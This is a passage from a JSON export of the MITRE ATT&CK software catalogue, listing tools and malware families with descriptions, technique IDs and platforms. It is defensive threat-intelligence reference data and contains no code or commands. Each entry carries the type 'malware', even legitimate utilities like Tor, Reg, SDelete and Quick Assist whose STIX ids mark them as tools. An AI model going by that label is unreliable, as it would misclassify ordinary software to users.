        "T1071.001",
        "T1047",
        "T1059.001",
        "T1115",
        "T1548.002",
        "T1046",
        "T1021.001",
        "T1059.003",
        "T1083",
        "T1547.001",
        "T1003.003",
        "T1569.002",
        "T1005",
        "T1573.002",
        "T1135",
        "T1218.011",
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0250",
      "stix_id": "tool--c8655260-9f4b-44e3-85e1-6538a5f6e4f4",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-11-17T14:12:07.296000+00:00"
    },
    "S0111": {
      "id": "S0111",
      "name": "schtasks",
      "description": "[schtasks](https://attack.mitre.org/software/S0111) is used to schedule execution of programs or scripts on a Windows system to run at a specific date and time. (Citation: TechNet Schtasks)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0111",
      "stix_id": "tool--c9703cd3-141c-43a0-a926-380082be5d04",
      "created": "2017-05-31T21:33:07.218000+00:00",
      "modified": "2025-04-16T20:38:56.004000+00:00"
    },
    "S0119": {
      "id": "S0119",
      "name": "Cachedump",
      "description": "[Cachedump](https://attack.mitre.org/software/S0119) is a publicly-available tool that program extracts cached password hashes from a system\u2019s registry. (Citation: Mandiant APT1)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0119",
      "stix_id": "tool--c9cd7ec9-40b7-49db-80be-1399eddd9c52",
      "created": "2017-05-31T21:33:10.197000+00:00",
      "modified": "2025-04-25T14:45:28.653000+00:00"
    },
    "S0361": {
      "id": "S0361",
      "name": "Expand",
      "description": "[Expand](https://attack.mitre.org/software/S0361) is a Windows utility used to expand one or more compressed CAB files.(Citation: Microsoft Expand Utility) It has been used by [BBSRAT](https://attack.mitre.org/software/S0127) to decompress a CAB file into executable content.(Citation: Palo Alto Networks BBSRAT)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1570",
        "T1564.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0361",
      "stix_id": "tool--ca656c25-44f1-471b-9d9f-e2a3bbb84973",
      "created": "2019-02-19T19:17:14.971000+00:00",
      "modified": "2025-04-25T14:45:29.018000+00:00"
    },
    "S0192": {
      "id": "S0192",
      "name": "Pupy",
      "description": "[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1569.002",
        "T1046",
        "T1113",
        "T1552.001",
        "T1105",
        "T1135",
        "T1573.002",
        "T1548.002",
        "T1059.001",
        "T1033",
        "T1136.002",
        "T1041",
        "T1555.003",
        "T1123",
        "T1055.001",
        "T1016",
        "T1114.001",
        "T1543.002",
        "T1136.001",
        "T1547.013",
        "T1083",
        "T1082",
        "T1003.001",
        "T1056.001",
        "T1071.001",
        "T1497.001",
        "T1021.001",
        "T1550.003",
        "T1557.001",
        "T1087.001",
        "T1059.006",
        "T1125",
        "T1070.001",
        "T1134.001",
        "T1560.001",
        "T1547.001",
        "T1003.005",
        "T1003.004",
        "T1049",
        "T1555",
        "T1057"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "Android"
      ],
      "url": "https://attack.mitre.org/software/S0192",
      "stix_id": "tool--cb69b20d-56d0-41ab-8440-4a4b251614d4",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2023-09-28T21:08:47.128000+00:00"
    },
    "S0075": {
      "id": "S0075",
      "name": "Reg",
      "description": "[Reg](https://attack.mitre.org/software/S0075) is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. (Citation: Microsoft Reg)\n\nUtilities such as [Reg](https://attack.mitre.org/software/S0075) are known to be used by persistent threats. (Citation: Windows Commands JPCERT)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1552.002",
        "T1012",
        "T1112"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0075",
      "stix_id": "tool--cde2d700-9ed1-46cf-9bce-07364fe8b24f",
      "created": "2017-05-31T21:32:49+00:00",
      "modified": "2025-04-16T20:38:56.474000+00:00"
    },
    "S0095": {
      "id": "S0095",
      "name": "ftp",
      "description": "[ftp](https://attack.mitre.org/software/S0095) is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data.(Citation: Microsoft FTP)(Citation: Linux FTP)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1570",
        "T1048.003",
        "T1105"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0095",
      "stix_id": "tool--cf23bf4a-e003-4116-bbae-1ea6c558d565",
      "created": "2017-05-31T21:33:00.565000+00:00",
      "modified": "2024-08-14T15:21:48.196000+00:00"
    },
    "S0699": {
      "id": "S0699",
      "name": "Mythic",
      "description": "[Mythic](https://attack.mitre.org/software/S0699) is an open source, cross-platform post-exploitation/command and control platform. [Mythic](https://attack.mitre.org/software/S0699) is designed to \"plug-n-play\" with various agents and communication channels.(Citation: Mythic Github)(Citation: Mythic SpecterOps)(Citation: Mythc Documentation) Deployed [Mythic](https://attack.mitre.org/software/S0699) C2 servers have been observed as part of potentially malicious infrastructure.(Citation: RecordedFuture 2021 Ad Infra)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090.002",
        "T1071.002",
        "T1573.002",
        "T1071.004",
        "T1071.001",
        "T1132",
        "T1090.001",
        "T1095",
        "T1030",
        "T1119",
        "T1572",
        "T1090.004",
        "T1008"
      ],
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0699",
      "stix_id": "tool--d505fc8b-2e64-46eb-96d6-9ef7ffca5b66",
      "created": "2022-03-26T01:38:12.966000+00:00",
      "modified": "2025-04-16T20:38:56.653000+00:00"
    },
    "S0040": {
      "id": "S0040",
      "name": "HTRAN",
      "description": "[HTRAN](https://attack.mitre.org/software/S0040) is a tool that proxies connections through intermediate hops and aids users in disguising their true geographical location. It can be used by adversaries to hide their location when interacting with the victim networks. (Citation: Operation Quantum Entanglement)(Citation: NCSC Joint Report Public Tools)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090",
        "T1014",
        "T1055"
      ],
      "platforms": [
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0040",
      "stix_id": "tool--d5e96a35-7b0b-4c6a-9533-d63ecbda563e",
      "created": "2017-05-31T21:32:32.011000+00:00",
      "modified": "2024-11-17T16:27:34.671000+00:00"
    },
    "S0195": {
      "id": "S0195",
      "name": "SDelete",
      "description": "[SDelete](https://attack.mitre.org/software/S0195) is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. (Citation: Microsoft SDelete July 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1485"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0195",
      "stix_id": "tool--d8d19e33-94fd-4aa3-b94a-08ee801a2153",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:45:30.257000+00:00"
    },
    "S0262": {
      "id": "S0262",
      "name": "QuasarRAT",
      "description": "[QuasarRAT](https://attack.mitre.org/software/S0262) is an open-source, remote access tool that has been publicly available on GitHub since at least 2014. [QuasarRAT](https://attack.mitre.org/software/S0262) is developed in the C# language.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1021.001",
        "T1056.001",
        "T1573.001",
        "T1555.003",
        "T1547.001",
        "T1564.003",
        "T1082",
        "T1105",
        "T1614",
        "T1112",
        "T1564.001",
        "T1033",
        "T1548.002",
        "T1005",
        "T1095",
        "T1016",
        "T1555",
        "T1552.001",
        "T1059.003",
        "T1090",
        "T1571",
        "T1553.002",
        "T1053.005",
        "T1125"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0262",
      "stix_id": "tool--da04ac30-27da-4959-a67d-450ce47d9470",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-05-07T19:10:03.843000+00:00"
    },
    "S1205": {
      "id": "S1205",
      "name": "cipher.exe",
      "description": "[cipher.exe](https://attack.mitre.org/software/S1205) is a native Microsoft utility that manages encryption of directories and files on NTFS (New Technology File System) partitions by using the Encrypting File System (EFS).(Citation: cipher.exe)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1561.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1205",
      "stix_id": "tool--da66959d-9875-4fde-bfed-11111a55895e",
      "created": "2025-02-25T17:31:00.202000+00:00",
      "modified": "2025-03-10T19:48:40.412000+00:00"
    },
    "S1071": {
      "id": "S1071",
      "name": "Rubeus",
      "description": "[Rubeus](https://attack.mitre.org/software/S1071) is a C# toolset designed for raw Kerberos interaction that has been used since at least 2020, including in ransomware operations.(Citation: GitHub Rubeus March 2023)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed Run November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1558.003",
        "T1482",
        "T1558.002",
        "T1558.004",
        "T1558.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1071",
      "stix_id": "tool--e33267fe-099f-4af2-8730-63d49f8813b2",
      "created": "2023-03-29T20:19:26.940000+00:00",
      "modified": "2025-04-16T20:38:56.949000+00:00"
    },
    "S0183": {
      "id": "S0183",
      "name": "Tor",
      "description": "[Tor](https://attack.mitre.org/software/S0183) is a software suite and network that provides increased anonymity on the Internet. It creates a multi-hop proxy network and utilizes multilayer encryption to protect both the message and routing information. [Tor](https://attack.mitre.org/software/S0183) utilizes \"Onion Routing,\" in which messages are encrypted with multiple layers of encryption; at each step in the proxy network, the topmost layer is decrypted and the contents forwarded on to the next node until it reaches its destination. (Citation: Dingledine Tor The Second-Generation Onion Router)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.002",
        "T1090.003"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0183",
      "stix_id": "tool--ed7d0cb1-87a6-43b4-9f46-ef1bc56d6c68",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-03-25T22:52:49.139000+00:00"
    },
    "S0552": {
      "id": "S0552",
      "name": "AdFind",
      "description": "[AdFind](https://attack.mitre.org/software/S0552) is a free command-line query tool that can be used for gathering information from Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk and Trickbot January 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1482",
        "T1069.002",
        "T1016",
        "T1018",
        "T1087.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0552",
      "stix_id": "tool--f59508a6-3615-47c3-b493-6676e1a39a87",
      "created": "2020-12-28T18:35:50.244000+00:00",
      "modified": "2024-09-25T15:21:53.462000+00:00"
    },
    "S0645": {
      "id": "S0645",
      "name": "Wevtutil",
      "description": "[Wevtutil](https://attack.mitre.org/software/S0645) is a Windows command-line utility that enables administrators to retrieve information about event logs and publishers.(Citation: Wevtutil Microsoft Documentation)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.001",
        "T1562.002",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0645",
      "stix_id": "tool--f91162cc-1686-4ff8-8115-bf3f61a4cc7a",
      "created": "2021-09-14T21:45:30.280000+00:00",
      "modified": "2024-09-25T20:32:25.006000+00:00"
    },
    "S0224": {
      "id": "S0224",
      "name": "Havij",
      "description": "[Havij](https://attack.mitre.org/software/S0224) is an automatic SQL Injection tool distributed by the Iranian ITSecTeam security company. Havij has been used by penetration testers and adversaries. (Citation: Check Point Havij Analysis)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1190"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0224",
      "stix_id": "tool--fbd727ea-c0dc-42a9-8448-9e12962d1ab5",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:45:31.679000+00:00"
    },
    "S1209": {
      "id": "S1209",
      "name": "Quick Assist",
      "description": "[Quick Assist](https://attack.mitre.org/software/S1209) is a remote assistance tool primarily for Microsoft Windows, although a macOS version also exists. [Quick Assist](https://attack.mitre.org/software/S1209) allows for remote screen sharing and, with end user approval, remote control and command execution on the enabling device.(Citation: Microsoft Storm-1811 2024)(Citation: Microsoft Quick Assist 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1113",
        "T1125"
      ],
      "platforms": [
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S1209",
      "stix_id": "tool--fcdb30de-5449-4777-a4f4-922e71f65932",
      "created": "2025-03-14T19:13:01.957000+00:00",
      "modified": "2025-03-14T19:17:27.658000+00:00"
    },
    "S0029": {
      "id": "S0029",
      "name": "PsExec",
      "description": "[PsExec](https://attack.mitre.org/software/S0029) is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.(Citation: Russinovich Sysinternals)(Citation: SANS PsExec)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1021.002",
        "T1543.003",
        "T1570",
        "T1569.002",
        "T1136.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0029",
      "stix_id": "tool--ff6caf67-ea1f-4895-b80e-4bb0fc31c6db",
      "created": "2017-05-31T21:32:21.771000+00:00",
      "modified": "2024-09-25T20:31:21.768000+00:00"
    },
    "S0061": {
      "id": "S0061",
      "name": "HDoor",
      "description": "[HDoor](https://attack.mitre.org/software/S0061) is malware that has been customized and used by the [Naikon](https://attack.mitre.org/groups/G0019) group. (Citation: Baumgartner Naikon 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1562.001",
        "T1046"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0061",
      "stix_id": "malware--007b44b6-e4c5-480b-b5b9-56f2081b1b7b",
      "created": "2017-05-31T21:32:40.801000+00:00",
      "modified": "2025-04-16T20:37:51.573000+00:00"
    },
    "S0266": {
      "id": "S0266",
      "name": "TrickBot",
      "description": "[TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that first emerged in September 2016 as a possible successor to [Dyre](https://attack.mitre.org/software/S0024). [TrickBot](https://attack.mitre.org/software/S0266) was developed and initially used by [Wizard Spider](https://attack.mitre.org/groups/G0102) for targeting banking sites in North America, Australia, and throughout Europe; it has since been used against all sectors worldwide as part of \"big game hunting\" ransomware campaigns.(Citation: S2 Grupo TrickBot June 2017)(Citation: Fidelis TrickBot Oct 2016)(Citation: IBM TrickBot Nov 2016)(Citation: CrowdStrike Wizard Spider October 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1033",
        "T1559.001",
        "T1053.005",
        "T1542.003",
        "T1185",
        "T1106",
        "T1059.001",
        "T1041",
        "T1008",
        "T1021.005",
        "T1027",
        "T1543.003",
        "T1027.002",
        "T1552.001",
        "T1204.002",
        "T1573.001",
        "T1087.001",
        "T1135",
        "T1132.001",
        "T1566.002",
        "T1005",
        "T1562.001",
        "T1069",
        "T1552.002",
        "T1057",
        "T1087.003",
        "T1497.003",
        "T1219",
        "T1059.003",
        "T1036",
        "T1495",
        "T1140",
        "T1018",
        "T1571",
        "T1555.005",
        "T1112",
        "T1553.002",
        "T1110.004",
        "T1083",
        "T1056.004",
        "T1007",
        "T1105",
        "T1055",
        "T1090.002",
        "T1055.012",
        "T1210",
        "T1564.003",
        "T1547.001",
        "T1071.001",
        "T1027.013",
        "T1555.003",
        "T1482",
        "T1016",
        "T1566.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0266",
      "stix_id": "malware--00806466-754d-44ea-ad6f-0caf59cb8556",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-10T22:28:21.746000+00:00"
    },
    "S1204": {
      "id": "S1204",
      "name": "cd00r",
      "description": "[cd00r](https://attack.mitre.org/software/S1204) is an open-source backdoor for UNIX and UNIX-variant operating systems that was orginally released in 2000. [cd00r](https://attack.mitre.org/software/S1204) source code is primarily based on a packet-capturing program as it utilizes a sniffer to listen for specific sequences of network traffic or \"secret knock\" before executing the attacker's code.(Citation: Hartrell cd00r 2002)(Citation: Lumen J-Magic JAN 2025)\n\n",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1095",
        "T1016",
        "T1040",
        "T1205.001"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1204",
      "stix_id": "malware--00936d7a-451d-4a9c-88fc-05b141aa2d3f",
      "created": "2025-02-19T20:07:23.223000+00:00",
      "modified": "2025-04-15T19:46:33.009000+00:00"
    },
    "S0139": {
      "id": "S0139",
      "name": "PowerDuke",
      "description": "[PowerDuke](https://attack.mitre.org/software/S0139) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2016. It has primarily been delivered through Microsoft Word or Excel attachments containing malicious macros. (Citation: Volexity PowerDuke November 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1027.003",
        "T1218.011",
        "T1082",
        "T1083",
        "T1010",
        "T1485",
        "T1033",
        "T1057",
        "T1124",
        "T1070.004",
        "T1105",
        "T1564.004",
        "T1059.003",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0139",
      "stix_id": "malware--00c3bfcb-99bd-4767-8c03-b08f585f5c8a",
      "created": "2017-05-31T21:33:19.746000+00:00",
      "modified": "2025-04-25T14:42:30.325000+00:00"
    },
    "S0605": {
      "id": "S0605",
      "name": "EKANS",
      "description": "[EKANS](https://attack.mitre.org/software/S0605) is ransomware variant written in Golang that first appeared in mid-December 2019 and has been used against multiple sectors, including energy, healthcare, and automotive manufacturing, which in some cases resulted in significant operational disruptions. [EKANS](https://attack.mitre.org/software/S0605) has used a hard-coded kill-list of processes, including some associated with common ICS software platforms (e.g., GE Proficy, Honeywell HMIWeb, etc), similar to those defined in [MegaCortex](https://attack.mitre.org/software/S0576).(Citation: Dragos EKANS)(Citation: Palo Alto Unit 42 EKANS)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1486",
        "T1490",
        "T1047",
        "T1016",
        "T1489",
        "T1562.001",
        "T1027",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0605",
      "stix_id": "malware--00e7d565-9883-4ee5-b642-8fd17fd6a3f5",
      "created": "2021-02-12T20:07:42.883000+00:00",
      "modified": "2025-04-16T20:37:51.908000+00:00"
    },
    "S0520": {
      "id": "S0520",
      "name": "BLINDINGCAN",
      "description": "[BLINDINGCAN](https://attack.mitre.org/software/S0520) is a remote access Trojan that has been used by the North Korean government since at least early 2020 in cyber operations against defense, engineering, and government organizations in Western Europe and the US.(Citation: US-CERT BLINDINGCAN Aug 2020)(Citation: NHS UK BLINDINGCAN Aug 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1059.003",
        "T1071.001",
        "T1105",
        "T1005",
        "T1036.005",
        "T1132.001",
        "T1027.013",
        "T1553.002",
        "T1070.004",
        "T1027.002",
        "T1041",
        "T1016",
        "T1070.006",
        "T1129",
        "T1204.002",
        "T1218.011",
        "T1083",
        "T1566.001",
        "T1573.001",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0520",
      "stix_id": "malware--01dbc71d-0ee8-420d-abb4-3dfb6a4bf725",
      "created": "2020-10-27T18:45:58.576000+00:00",
      "modified": "2024-04-11T02:51:38.922000+00:00"
    },
    "S1100": {
      "id": "S1100",
      "name": "Ninja",
      "description": "[Ninja](https://attack.mitre.org/software/S1100) is a malware developed in C++ that has been used by [ToddyCat](https://attack.mitre.org/groups/G1022) to penetrate networks and control remote systems since at least 2020.  [Ninja](https://attack.mitre.org/software/S1100) is possibly part of a post exploitation toolkit exclusively used by [ToddyCat](https://attack.mitre.org/groups/G1022) and allows multiple operators to work simultaneously on the same machine. [Ninja](https://attack.mitre.org/software/S1100) has been used against government and military entities in Europe and Asia and observed in specific infection chains being deployed by [Samurai](https://attack.mitre.org/software/S1099).(Citation: Kaspersky ToddyCat June 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1095",
        "T1036.005",
        "T1016",
        "T1566.003",
        "T1204.002",
        "T1083",
        "T1106",
        "T1573.001",
        "T1029",
        "T1574.001",
        "T1082",
        "T1140",
        "T1001",
        "T1090.003",
        "T1480.001",
        "T1090.001",
        "T1218.011",
        "T1055",
        "T1543.003",
        "T1057",
        "T1001.003",
        "T1071.001",
        "T1027.015",
        "T1070.006",
        "T1559",
        "T1132.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1100",
      "stix_id": "malware--023254de-caaf-4a05-b2c7-e4e2f283f7a5",
      "created": "2024-01-11T18:40:51.497000+00:00",
      "modified": "2024-04-17T22:02:37.451000+00:00"
    },
    "S1145": {
      "id": "S1145",
      "name": "Pikabot",
      "description": "[Pikabot](https://attack.mitre.org/software/S1145) is a backdoor used for initial access and follow-on tool deployment active since early 2023. [Pikabot](https://attack.mitre.org/software/S1145) is notable for extensive use of multiple encoding, encryption, and defense evasion mechanisms to evade defenses and avoid analysis. [Pikabot](https://attack.mitre.org/software/S1145) has some overlaps with [QakBot](https://attack.mitre.org/software/S0650), but insufficient evidence exists to definitively link these two malware families. [Pikabot](https://attack.mitre.org/software/S1145) is frequently used to deploy follow on tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154) or ransomware variants.(Citation: Zscaler Pikabot 2023)(Citation: Elastic Pikabot 2024)(Citation: Logpoint Pikabot 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1059.003",
        "T1482",
        "T1055.003",
        "T1622",
        "T1571",
        "T1573.001",
        "T1041",
        "T1087.001",
        "T1106",
        "T1082",
        "T1027.011",
        "T1027.003",
        "T1620",
        "T1132.001",
        "T1140",
        "T1027.009",
        "T1055.002",
        "T1480.001",
        "T1547.001",
        "T1497.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1145",
      "stix_id": "malware--02739f57-7585-4319-acd3-794ae8ff3a70",
      "created": "2024-07-12T19:07:40.654000+00:00",
      "modified": "2024-10-28T19:01:43.612000+00:00"
    },
    "S0206": {
      "id": "S0206",
      "name": "Wiarp",
      "description": "[Wiarp](https://attack.mitre.org/software/S0206) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Wiarp May 2012)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1059.003",
        "T1055",
        "T1543.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0206",
      "stix_id": "malware--039814a0-88de-46c5-a4fb-b293db21880a",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T19:55:07.588000+00:00"
    },
    "S0662": {
      "id": "S0662",
      "name": "RCSession",
      "description": "[RCSession](https://attack.mitre.org/software/S0662) is a backdoor written in C++ that has been in use since at least 2018 by [Mustang Panda](https://attack.mitre.org/groups/G0129) and by [Threat Group-3390](https://attack.mitre.org/groups/G0027) (Type II Backdoor).(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Trend Micro Iron Tiger April 2021)(Citation: Trend Micro DRBControl February 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573",
        "T1055.012",
        "T1057",
        "T1218.007",
        "T1113",
        "T1056.001",
        "T1105",
        "T1106",
        "T1071.001",
        "T1033",
        "T1070.004",
        "T1547.001",
        "T1027.015",
        "T1005",
        "T1095",
        "T1082",
        "T1027.011",
        "T1036",
        "T1112",
        "T1574.001",
        "T1059.003",
        "T1548.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0662",
      "stix_id": "malware--03acae53-9b98-46f6-b204-16b930839055",
      "created": "2021-11-19T19:47:26.552000+00:00",
      "modified": "2024-04-11T00:21:49.455000+00:00"
    },
    "S0543": {
      "id": "S0543",
      "name": "Spark",
      "description": "\n[Spark](https://attack.mitre.org/software/S0543) is a Windows backdoor and has been in use since as early as 2017.(Citation: Unit42 Molerat Mar 2020) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.002",
        "T1614.001",
        "T1059.003",
        "T1132.001",
        "T1082",
        "T1497.002",
        "T1033",
        "T1140",
        "T1041",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0543",
      "stix_id": "malware--03ea629c-517a-41e3-94f8-c7e5368cf8f4",
      "created": "2020-12-15T01:30:05.198000+00:00",
      "modified": "2025-04-25T14:42:31.753000+00:00"
    },
    "S0686": {
      "id": "S0686",
      "name": "QuietSieve",
      "description": "[QuietSieve](https://attack.mitre.org/software/S0686) is an information stealer that has been used by [Gamaredon Group](https://attack.mitre.org/groups/G0047) since at least 2021.(Citation: Microsoft Actinium February 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1564.003",
        "T1071.001",
        "T1105",
        "T1016.001",
        "T1083",
        "T1120",
        "T1005",
        "T1135",
        "T1113"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0686",
      "stix_id": "malware--03eb4a05-6a02-43f6-afb7-3c7835501828",
      "created": "2022-02-18T16:46:39.268000+00:00",
      "modified": "2025-04-16T20:37:52.215000+00:00"
    },
    "S0242": {
      "id": "S0242",
      "name": "SynAck",
      "description": "[SynAck](https://attack.mitre.org/software/S0242) is variant of Trojan ransomware targeting mainly English-speaking users since at least fall 2017. (Citation: SecureList SynAck Doppelg\u00e4nging May 2018) (Citation: Kaspersky Lab SynAck May 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1112",
        "T1070.001",
        "T1027",
        "T1033",
        "T1497.001",
        "T1082",
        "T1055.013",
        "T1106",
        "T1012",
        "T1486",
        "T1007",
        "T1614.001",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0242",
      "stix_id": "malware--04227b24-7817-4de1-9050-b7b1b57f5866",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:42:32.305000+00:00"
    },
    "S1039": {
      "id": "S1039",
      "name": "Bumblebee",
      "description": "[Bumblebee](https://attack.mitre.org/software/S1039) is a custom loader written in C++ that has been used by multiple threat actors, including possible initial access brokers, to download and execute additional payloads since at least March 2022. [Bumblebee](https://attack.mitre.org/software/S1039) has been linked to ransomware operations including [Conti](https://attack.mitre.org/software/S0575), Quantum, and Mountlocker and derived its name from the appearance of \"bumblebee\" in the user-agent.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)\n",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1033",
        "T1047",
        "T1041",
        "T1059.003",
        "T1497.001",
        "T1140",
        "T1055.001",
        "T1560",
        "T1497.003",
        "T1218.008",
        "T1005",
        "T1518.001",
        "T1055.004",
        "T1059.005",
        "T1102",
        "T1497",
        "T1105",
        "T1008",
        "T1566.002",
        "T1132.001",
        "T1218.011",
        "T1036.005",
        "T1055",
        "T1106",
        "T1027",
        "T1129",
        "T1012",
        "T1573.001",
        "T1548.002",
        "T1057",
        "T1204.001",
        "T1566.001",
        "T1053.005",
        "T1204.002",
        "T1059.001",
        "T1559.001",
        "T1622",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1039",
      "stix_id": "malware--04378e79-4387-468a-a8f7-f974b8254e44",
      "created": "2022-08-19T20:28:36.981000+00:00",
      "modified": "2024-09-17T17:58:55.921000+00:00"
    },
    "S0233": {
      "id": "S0233",
      "name": "MURKYTOP",
      "description": "[MURKYTOP](https://attack.mitre.org/software/S0233) is a reconnaissance tool used by [Leviathan](https://attack.mitre.org/groups/G0065). (Citation: FireEye Periscope March 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1018",
        "T1082",
        "T1070.004",
        "T1059.003",
        "T1069",
        "T1053.002",
        "T1135",
        "T1046",
        "T1087.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0233",
      "stix_id": "malware--049ff071-0b3c-4712-95d2-d21c6aa54501",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:42:32.856000+00:00"
    },
    "S1125": {
      "id": "S1125",
      "name": "AcidRain",
